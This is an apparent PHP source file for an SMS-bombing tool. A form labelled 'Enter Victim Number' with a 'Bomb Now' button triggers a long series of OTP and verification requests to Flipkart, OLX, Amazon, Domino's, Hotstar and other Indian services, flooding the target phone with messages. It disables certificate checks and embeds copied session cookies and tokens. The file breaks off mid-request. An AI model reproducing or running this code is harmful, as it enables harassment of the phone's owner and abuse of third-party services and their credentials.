<?php



if(!isset($_GET['submit'])){
echo '<html>

 


<hr><div class="error" color="red">
Do Not Try on self Number Otherwise We Are Not Responsible For any Damage to Your Phone <hr>
<div class="container">
<form method="get" action="">

 <label>Enter Victim Number</label>
<input type="number" name="mo" class="text"
placeholder="Enter Victim Number">

<input type="submit"class="submit" value="Bomb Now" name="submit">




	
	'; }

if(isset($_GET['submit'])){
$mo=$_GET['mo'];
$device=$_GET['device'];


function RandomNumber($length)
{
$str="";
for($i=0;$i<$length;$i++){
$str.=mt_rand(0,9);
}
return $str;
}
$n = array('charan','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','fidju','arihanth','babu','priya','preethi','priyanka','preetham','suman','sunitha','tanu','manu','mahesh','mahendra','manoj','vikas','abhinav','arya','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','fidju','arihanth','babu','priya','preethi','priyanka','ananth','sumana','saritha','yogesh','razz');
$fname = $n[mt_rand(0,count($n))];	



$imei=RandomNumber(15);
$user=RandomNumber(21);

$protect="00000";

if ($mo == $protect) {
    
    echo " <meta http-equiv='refresh' content=0;url=https://t.me/crazyhero0>";
    
}

else {
    

$url16="https://www.nykaafashion.com/webscripts/api/otp/generate";

$data16='{"customer_mobile":"'.$mo.'"}';

$ronak16[]='Host: www.nykaafashion.com';
$ronak16[]='platform: Android';
$ronak16[]='build: 3408';
$ronak16[]='version: 1.6.8';
$ronak16[]='content-type: application/json; charset=UTF-8';
$ronak16[]='user-agent: okhttp/3.14.4';

$ch0=curl_init();
curl_setopt($ch0, CURLOPT_URL,$url16);
curl_setopt($ch0, CURLOPT_HEADER,0);
curl_setopt($ch0, CURLOPT_HTTPHEADER,$ronak16);
curl_setopt($ch0, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch0, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch0, CURLOPT_POST, 1);
curl_setopt($ch0, CURLOPT_POSTFIELDS,$data16);
curl_setopt($ch0, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch0, CURLOPT_FOLLOWLOCATION,0);
$one0=curl_exec($ch0);



$url13="https://api.jeet11.com:443/account-service/external/v1.0.0/sendOtp";

$data13='{
 "phoneNo":"'.$mo.'",
 "countryAreaCode":"91",
 "language":"English"
}';
$ronak13[]='Content-Type: application/json;charset=UTF-8';
$ronak13[]='User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1853 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36';
$ronak13[]='Host: api.jeet11.com';
$ronak13[]='Referer: https://www.jeet11.com/login?refCode=$refer&referrer=whatsapp';
$ronak13[]='Connection: Keep-Alive';

$ch1=curl_init();
curl_setopt($ch1, CURLOPT_URL,$url13);
curl_setopt($ch1, CURLOPT_HEADER,0);
curl_setopt($ch1, CURLOPT_HTTPHEADER,$ronak13);
curl_setopt($ch1, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch1, CURLOPT_POST, 1);
curl_setopt($ch1, CURLOPT_POSTFIELDS,$data13);
curl_setopt($ch1, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch1, CURLOPT_FOLLOWLOCATION,0);
$one1=curl_exec($ch1);


$url2 = "https://api.olx.in/v1/auth/authenticate";
$data2 = '{"grantType":"retry","method":"call","phone":"+91'.$mo.'"}';
$headers2 = array('X-acf-sensor-data: 1,a,rghPk9HEHtrz23TJbUafCSJLELUFSPOWLtDgBAjSxJ2HEzOFGw3gr6hTwY9ucpaHWEHvrvGengvJB2dkfOzU/0SNxuX6GM6+Plag8QZOgOHVC60nNs0qTN0BFOGIofUaO1bE22i/OABdOzKsk9AVGe83+ia0ooX3DVwrKuAXd90=,LUyUx2cLqes/Z+ZxGewgTpCVHrK6/52CfzZozOix+b2TySjVgM5JGFcYAx3OCFUWoLMm7w122WK4P9QCA7hp7SOZf2EvpVJV+yOkPOkMGykwxvLMZk6dNjox91hS3H+ufR2mpjMgTtSaQO+oyKehvrRK7WrwCBkFhB0DJSJJjmg=$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$1000,1000,0',"X-Panamera-fingerprint: 0e9c630334d8b6b1","User-Agent: android 14.13.002 olxin","x-origin-panamera: Production","laquesis: pan-37807@b#pan-41424@b#pan-41767@b#pan-42113@b#pan-42275@c#pan-43142@a#pan-43682@c#pan-43681@d#pan-41213@c#pan-43414@b#pan-41045@b#pan-45613@b#pan-45216@a#pan-43562@a","laquesisff: rate_us#resend_code_call_me#listers_verification#contact_card#legion_login#show_advertisement#default_near_me#notification_pref#edit_location#legion_migrate_v2#pan-27935#pan-36788#pan-38000#pan-42665#pan-43831#pan-41327","Content-Type: application/json; charset=UTF-8","Content-Length: 61","Host: api.olx.in","Connection: Keep-Alive");


$ch2=curl_init();
curl_setopt($ch2, CURLOPT_URL,$url2);
curl_setopt($ch2, CURLOPT_HEADER,0);
curl_setopt($ch2, CURLOPT_HTTPHEADER,$headers2);
curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_POSTFIELDS,$data2);
curl_setopt($ch2, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch2, CURLOPT_FOLLOWLOCATION,0);
$one2=curl_exec($ch2);


$url3 = "https://www.flipkart.com/api/5/user/otp/generate";
$data3 = "loginId=%2B91$mo&state=VERIFIED&churnEmailRequest=false";
$headers3 = array("Cookie: T=BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050; SWAB=build-44be9e47461a74d737914207bcbafc30; lux_uid=155867904381892986; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; s_cc=true; SN=2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078; gpv_pn=HomePage; gpv_pn_t=Homepage; S=d1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==; s_sq=%5B%5BB%5D%5D","Accept: */*","Connection: keep-alive","User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36","Referer: https://www.flipkart.com/","Host: www.flipkart.com","Accept-Encoding: gzip, deflate, br","Save-Data: on","X-user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop","Accept-Language: en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6","Content-Type: application/x-www-form-urlencoded","Content-Length: 62");


$ch3=curl_init();
curl_setopt($ch3, CURLOPT_URL,$url3);
curl_setopt($ch3, CURLOPT_HEADER,0);
curl_setopt($ch3, CURLOPT_HTTPHEADER,$headers3);
curl_setopt($ch3, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch3, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch3, CURLOPT_POST, 1);
curl_setopt($ch3, CURLOPT_POSTFIELDS,$data3);
curl_setopt($ch3, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch3, CURLOPT_FOLLOWLOCATION,0);
$one3=curl_exec($ch3);


$url = "https://unacademy.com/api/v3/user/user_check/";
$data = '{"phone":"'.$mo.'","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}';
$headers = array("content-type: application/json; charset=utf-8","content-length: 107","accept-encoding: gzip","user-agent: okhttp/3.12.0");


$ch4=curl_init();
curl_setopt($ch4, CURLOPT_URL,$url);
curl_setopt($ch4, CURLOPT_HEADER,0);
curl_setopt($ch4, CURLOPT_HTTPHEADER,$headers);
curl_setopt($ch4, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch4, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch4, CURLOPT_POST, 1);
curl_setopt($ch4, CURLOPT_POSTFIELDS,$data);
curl_setopt($ch4, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch4, CURLOPT_FOLLOWLOCATION,0);
$one4=curl_exec($ch4);

$url6 = "https://api.lenskart.com/v2/customers/sendOtp";
$data6 = '{"telephone":"'.$mo.'"}';
$headers6 = array("x-api-client: desktop","x-session-token: 62dd4d88-36b5-48e9-a63a-64510a8502ed","content-type: application/json; charset=utf-8","content-length: 26","accept-encoding: gzip","user-agent: okhttp/3.12.0");


$ch5=curl_init();
curl_setopt($ch5, CURLOPT_URL,$url6);
curl_setopt($ch5, CURLOPT_HEADER,0);
curl_setopt($ch5, CURLOPT_HTTPHEADER,$headers6);
curl_setopt($ch5, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch5, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch5, CURLOPT_POST, 1);
curl_setopt($ch5, CURLOPT_POSTFIELDS,$data6);
curl_setopt($ch5, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch5, CURLOPT_FOLLOWLOCATION,0);
$one5=curl_exec($ch5);


$url0 = "https://www.amazon.in/kindle-dbs/ajax/SendSMSorEmail?ref=kcpapp_snt";
$data0 = "recipient=$mo&client=kcp&communicationType=sms";
$headers0 = array("x-requested-with: XMLHttpRequest","user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0","content-type: application/x-www-form-urlencoded; charset=utf-8","content-length: 53","accept-encoding: gzip");


$ch6=curl_init();
curl_setopt($ch6, CURLOPT_URL,$url0);
curl_setopt($ch6, CURLOPT_HEADER,0);
curl_setopt($ch6, CURLOPT_HTTPHEADER,$headers0);
curl_setopt($ch6, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch6, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch6, CURLOPT_POST, 1);
curl_setopt($ch6, CURLOPT_POSTFIELDS,$data0);
curl_setopt($ch6, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch6, CURLOPT_FOLLOWLOCATION,0);
$one6=curl_exec($ch6);



$url00 = "https://api.dominos.co.in/loginhandler/forgotpassword";
$data00 = '{"lastName":"","mobile":"'.$mo.'","firstName":""}';
$headers00 = array("referer: https://pizzaonline.dominos.co.in/menu","origin: https://pizzaonline.dominos.co.in","content-type: application/json; charset=utf-8","content-length: 52","accept-encoding: gzip","user-agent: okhttp/3.12.0");


$ch7=curl_init();
curl_setopt($ch7, CURLOPT_URL,$url00);
curl_setopt($ch7, CURLOPT_HEADER,0);
curl_setopt($ch7, CURLOPT_HTTPHEADER,$headers00);
curl_setopt($ch7, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch7, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch7, CURLOPT_POST, 1);
curl_setopt($ch7, CURLOPT_POSTFIELDS,$data00);
curl_setopt($ch7, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch7, CURLOPT_FOLLOWLOCATION,0);
$one7=curl_exec($ch7);

$url000 = "https://www.netmeds.com/cms/mobisms/submit";
$data000 = "MessageID=netmeds163&phoneNumber=$mo&attributes%5B%5BorderID%5D%5D=";
$headers000 = array("content-type: application/x-www-form-urlencoded","content-length: 74","accept-encoding: gzip","user-agent: okhttp/3.12.0");


$ch8=curl_init();
curl_setopt($ch8, CURLOPT_URL,$url000);
curl_setopt($ch8, CURLOPT_HEADER,0);
curl_setopt($ch8, CURLOPT_HTTPHEADER,$headers000);
curl_setopt($ch8, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch8, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch8, CURLOPT_POST, 1);
curl_setopt($ch8, CURLOPT_POSTFIELDS,$data000);
curl_setopt($ch8, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch8, CURLOPT_FOLLOWLOCATION,0);
$one8=curl_exec($ch8);

$url122 = "https://marketing.tllms.com/elearn/api/v4/authentications/request_otp";
$data122 = '{"mobile":"+91-9493481529","type":"regsiter"}';
$headers122= array('X-TNL-APPVERSION: 9329 ','X-TNL-DEVICEOS: android ', 'X-TNL-APPID: 1 ', 'X-TNL-FEATURES: quizzo;v=2,search;v=2,player;v=4 ', 'Content-Type: application/json; charset=UTF-8 ', 'Content-Length: '.strlen($data122).'', 'Host: marketing.tllms.com ', 'Connection: Keep-Alive ', 'User-Agent: okhttp/3.14.9');

$ch9=curl_init();
curl_setopt($ch9, CURLOPT_URL,$url122);
curl_setopt($ch9, CURLOPT_HEADER,0);
curl_setopt($ch9, CURLOPT_HTTPHEADER,$headers122);
curl_setopt($ch9, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch9, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch9, CURLOPT_POST, 1);
curl_setopt($ch9, CURLOPT_POSTFIELDS,$data122);
curl_setopt($ch9, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch9, CURLOPT_FOLLOWLOCATION,0);
$one9=curl_exec($ch9);


$url001 = "https://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=$mo";
$data001 = '';
$headers001 = array("content-type: application/json");


$ch10=curl_init();
curl_setopt($ch10, CURLOPT_URL,$url001);
curl_setopt($ch10, CURLOPT_HEADER,0);
curl_setopt($ch10, CURLOPT_HTTPHEADER,$headers001);
curl_setopt($ch10, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch10, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch10, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch10, CURLOPT_FOLLOWLOCATION,0);
$one10=curl_exec($ch10);

$url1a1="https://www.fiewin.com/fiewin/api/user/sms";

$data1a1='{"phone":"'.$mo.'"}';


$hi[]='Host: www.fiewin.com';
$hi[]='content-length: '.strlen($data1a1).'';
$hi[]='Origin: https://www.fiewin.com';
$hi[]='User-Agent: Mozilla/5.0 (Linux; Android 9; SM-J810G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36';
$hi[]='Content-Type: application/json';
$hi[]='Accept: application/json';
$hi[]='Platform: web';
$hi[]='Save-Data: on';
$hi[]='token: null';
$hi[]='Referer: https://www.fiewin.com/';
$hi[]='Accept-Language: en-GB,en-US;q=0.9,en;q=0.8';

$ch11 = curl_init();
curl_setopt($ch11, CURLOPT_URL,$url1a1);
curl_setopt($ch11, CURLOPT_HEADER,0);
curl_setopt($ch11, CURLOPT_HTTPHEADER,$hi);
curl_setopt($ch11, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch11, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch11, CURLOPT_POST, 1);
curl_setopt($ch11, CURLOPT_POSTFIELDS,$data1a1);
curl_setopt($ch11, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch11, CURLOPT_FOLLOWLOCATION,0);
$one11=curl_exec($ch11);

$url010 = "https://api.hotstar.com/um/v3/users/cf9b13e575934a95a6b272f43df6d841/register?register-by=phone_otp";
$data010 = '{"phone_number":"'.$mo.'","country_prefix":"91"}';
$headers010 = array("content-length: 51","x-hs-usertoken: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDQ3MzUxNTUsImlhdCI6MTYwNDEzMDM1NSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcImNmOWIxM2U1NzU5MzRhOTVhNmIyNzJmNDNkZjZkODQxXCIsXCJwSWRcIjpcImVhMmQ0Y2ZjMGNiZDQ0NmQ5MDE2MWI5YTg3OWYxOTRlXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwNToyMDE6YzAxNjo0MGFkOmU4OWQ6OGMwNjo0OTU3OjMzMjVcIixcImNvdW50cnlDb2RlXCI6XCJpblwiLFwiY3VzdG9tZXJUeXBlXCI6XCJudVwiLFwidHlwZVwiOlwiZ3Vlc3RcIixcImlzRW1haWxWZXJpZmllZFwiOmZhbHNlLFwiaXNQaG9uZVZlcmlmaWVkXCI6ZmFsc2UsXCJkZXZpY2VJZFwiOlwiMjVhMWQ1NzYtNzVjMy00ZGNhLTg5MmYtNTY0MDkzZmEwZmI3XCIsXCJwcm9maWxlXCI6XCJBRFVMVFwiLFwidmVyc2lvblwiOlwidjJcIixcInN1YnNjcmlwdGlvbnNcIjp7XCJpblwiOnt9fSxcImlzc3VlZEF0XCI6MTYwNDEzMDM1NTk4MH0iLCJ2ZXJzaW9uIjoiMV8wIn0.ti3MDllTW7Isc5pjIcXFKV0Wpwq0wmYZgLkoi6dVG10","user-agent: Mozilla/5.0 (Linux; Android 10; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36","content-type: application/json","x-hs-platform: PCTV","x-country-code: IN","x-hs-device-id: 25a1d576-75c3-4dca-892f-564093fa0fb7","hotstarauth: st=1604392356~exp=1604398356~acl=/um/v3/*~hmac=e690a0e2de937e7c39c2a1a83a05642b1806f9703c2643d521944459f6b6a08f","save-data: on","x-hs-appversion: 6.94.1","x-request-id: 25a1d576-75c3-4dca-892f-564093fa0fb7","accept: */*","origin: https://www.hotstar.com","sec-fetch-site: same-site","sec-fetch-mode: cors","sec-fetch-dest: empty","referer: https://www.hotstar.com/","accept-encoding: gzip, deflate, br","accept-language: en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7");


$ch12=curl_init();
curl_setopt($ch12, CURLOPT_URL,$url010);
curl_setopt($ch12, CURLOPT_HEADER,0);
curl_setopt($ch12, CURLOPT_HTTPHEADER,$headers010);
curl_setopt($ch12, CURLOPT_POSTFIELDS,$data010);
curl_setopt($ch12, CURLOPT_CUSTOMREQUEST, "PUT");
curl_setopt($ch12, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch12, CURLOPT_FOLLOWLOCATION,0);
$one12=curl_exec($ch12);

$url121 = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/";
$data121 = 'mobile='.$mo.'';
$headers121 = array("content-length: 17","accept: */*","x-requested-with: XMLHttpRequest","save-data: on","user-agent: Mozilla/5.0 (Linux; Android 10; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36","content-type: application/x-www-form-urlencoded; charset=UTF-8","origin: https://www.apollopharmacy.in","sec-fetch-site: same-origin","sec-fetch-mode: cors","sec-fetch-dest: empty","referer: https://www.apollopharmacy.in/sociallogin/mobile/login/","accept-encoding: gzip, deflate, br","accept-language: en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7","cookie: cfduid=d367d9b36f33a61a086f775a04b9071591604392025","cookie: PHPSESSID=amgcgd74nliuiqe026i9j8uf83","cookie: _ga=GA1.2.15029138.1604392028","cookie: _gid=GA1.2.259643766.1604392028","cookie: _gat=1","cookie: _fbp=fb.1.1604392029318.1245291951","cookie: _gat_UA-31142855-1=1","cookie: mage-translation-storage=%7B%7D","cookie: mage-translation-file-version=%7B%7D","cookie: ta_device=Waf7rhYUkZUXLiEfvrxT6bfBXXLyTK9q","cookie: ta_visit=UiJdhVX37frYiGFacSFewhjNe3I2KD02","cookie: ta_ping=1","cookie: mage-cache-storage=%7B%7D","cookie: mage-cache-storage-section-invalidation=%7B%7D","cookie: mage-cache-sessid=true","cookie: mage-messages=","cookie: section_data_ids=%7B%22customer%22%3A1604391796%2C%22compare-products%22%3A1604391796%2C%22last-ordered-items%22%3A1604391796%2C%22cart%22%3A1604391796%2C%22directory-data%22%3A1604391796%2C%22cadence-fbpixel-fpc%22%3A1604391796%2C%22review%22%3A1604391796%2C%22ammessages%22%3A1604391796%2C%22wishlist%22%3A1604391796%2C%22paypal-billing-agreement%22%3A1604391796%7D","cookie: AWSALB=bt7Kx8vRSIKr5iDAEg81H3qp1BCF2vu4hUj4AapAMcvCBbiSDSlJvhfsv4hYpYYbwEfI2sO/aeroO2yOcc0E9B0sxKLPJoI8ggSGIk7mWXmvwvOB5UsiUxNEYpb5","cookie: AWSALBCORS=bt7Kx8vRSIKr5iDAEg81H3qp1BCF2vu4hUj4AapAMcvCBbiSDSlJvhfsv4hYpYYbwEfI2sO/aeroO2yOcc0E9B0sxKLPJoI8ggSGIk7mWXmvwvOB5UsiUxNEYpb5","cookie: private_content_version=343f0007615ba87464a4952f3418bfcd");


$ch13=curl_init();
curl_setopt($ch13, CURLOPT_URL,$url121);
curl_setopt($ch13, CURLOPT_HEADER,0);
curl_setopt($ch13, CURLOPT_HTTPHEADER,$headers121);
curl_setopt($ch13, CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($ch13, CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($ch13, CURLOPT_POST, 1);
curl_setopt($ch13, CURLOPT_POSTFIELDS,$data121);
curl_setopt($ch13, CURLOPT_RETURNTRANSFER,TRUE);
curl_setopt($ch13, CURLOPT_FOLLOWLOCATION,0);
$one13=curl_exec($ch13);


$url1221 = "https://api.pizzahut.io/v1/otp/generate";
$data1221 = '{"phone":"+91'.$mo.'"}';
